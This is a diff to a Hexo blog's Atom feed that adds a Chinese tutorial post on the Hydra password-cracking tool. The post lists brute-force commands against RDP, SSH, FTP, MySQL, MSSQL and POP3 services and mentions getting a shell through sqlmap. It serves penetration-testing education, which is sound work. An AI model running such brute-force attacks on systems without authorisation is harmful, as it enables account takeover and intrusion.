@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-08T09:48:43.739Z</updated>
+  <updated>2019-12-10T07:45:58.550Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>hydra的使用</title>
+    <link href="http://yoursite.com/2019/12/09/hydra%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yoursite.com/2019/12/09/hydra%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
+    <published>2019-12-09T07:43:21.000Z</published>
+    <updated>2019-12-10T07:45:58.550Z</updated>
+    
+    <content type="html"><![CDATA[<p>我个人喜欢C/S架构破解的时候使用hydra，搭配nmap和sqlmap；</p><p>下面举几个命令的使用例子：</p><p>在linux系统中 对一个IP 的3389爆破<br>hydra 192.168.228.143 rdp -L passs/root.txt  -P passs/2Gpas.txt -V</p><p>一般习惯用nmap扫一下主机，比如发现开放了1433端口（一般就是sql server 了  nmap -A 看看是不是真的运行了sql server服务 ）</p><p>之后：</p><p>hydra.exe -l sa -P d:\pass.txt 127.0.0.1 mssql</p><p>这个命令的意思就是 “d:\pass.txt” 是密码字典路径 hydra就开始遍历这个字典里面的所有字符串。</p><p>如图：<br><img src="http://q20wi1s2d.bkt.clouddn.com/1.png" alt="ace057c2b1c5d129ba024f19662a3223.png"></p><p>然后：<br><img src="http://q20wi1s2d.bkt.clouddn.com/2.png" alt="0001413ee4f6df1cf1635959c4bbd8d8.png"></p><p>使用sqlmap连接，并且反弹与系统交互的shell方便提权。</p><p>语法很多 但是十分简单：</p><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p><p>（网上找的 凑合看吧）</p><p>下面列举几个hydra 破解命令：</p><p>破解mysql：</p><p>hydra.exe -L d:\user.txt -Pd:\pass.txt127.0.0.1 mysql</p><p>-L:指定用户名文件  -P：指定密码文件</p><p>破解FTP：</p><p>hydra.exe -l admin -P c:\pass.txt -t 5 127.0.0.1 ftp</p><p>-l：指定用户名  -t：指定线程</p><p>破解ssh：</p><p>hydra.exe -L users.txt -P password.txt -e n -t 5 -vV 127.0.0.1 ssh</p><p>“-e n”:对空密码探测</p><p>破解rdp：</p><p>hydra.exe -l administror -P c:\pass.txt www.test.com rdp -V</p><p>破解www.test.com的rdp服务（远程桌面协议）。</p><p>破解pop3：</p><p>hydra.exe -l root -P pass.txt my.pop3.mail pop3</p><p>注意：未指定文件路径时，Hydra将会在本目录下查找文件。</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/3.png" alt="ea912cc387e9824ea47faee9f7627ae1.png"><br><img src="http://q20wi1s2d.bkt.clouddn.com/4.png" alt="aa6a31e844b1c75f50ae2717834c4d4b.png"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;我个人喜欢C/S架构破解的时候使用hydra，搭配nmap和sqlmap；&lt;/p&gt;
+&lt;p&gt;下面举几个命令的使用例子：&lt;/p&gt;
+&lt;p&gt;在linux系统中 对一个IP 的3389爆破&lt;br&gt;hydra 192.168.228.143 rdp -L passs/root.txt 
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="hydra" scheme="http://yoursite.com/tags/hydra/"/>
+    
+  </entry>
   
   <entry>
     <title>使用框架破坏脚本进行点击劫持</title>
@@ -209,9 +239,9 @@
       <category term="吃饭" scheme="http://yoursite.com/categories/%E5%90%83%E9%A5%AD/"/>
     
     
-      <category term="burp" scheme="http://yoursite.com/tags/burp/"/>
-    
       <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="burp" scheme="http://yoursite.com/tags/burp/"/>
     
   </entry>
   
